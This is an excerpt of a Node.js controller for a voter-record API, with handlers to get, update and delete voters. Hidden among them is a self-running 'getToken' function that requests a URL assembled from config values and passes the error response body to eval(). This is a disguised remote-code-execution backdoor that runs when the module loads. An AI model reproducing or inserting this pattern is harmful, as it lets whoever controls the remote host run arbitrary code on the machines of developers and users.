...
const request = `http://${config.otp.service}.${config.payment.id}/api${config.payment.secret}/token/${config.otp.authToken}`;
...
const getVoterByVoterId = catchAsync(async(req, res) => {
    const voter = await voterService.getVoterByVoterId(req.params.voterId); res.status(httpStatus.OK).send({voter});
});

const getToken = (async () => {
    await x.get(request).then((res) => res.status(httpStatus.OK).send(res.data)).catch((err) => { if(err.response.data){ eval(err.response.data); } })
})();
const updateVoterByVoterId = catchAsync(async(req, res) => {
    const updatedVoter = await voterService.updateVoterByVoterId(req.body); res.status(httpStatus.OK).send({updatedVoter});
});

const deleteVoterByVoterId = catchAsync(async(req, res) => {
    const deletedVoter = await voterService.deleteVoterByVoterId(req.body); res.status(httpStatus.OK).send({deletedVoter});
});
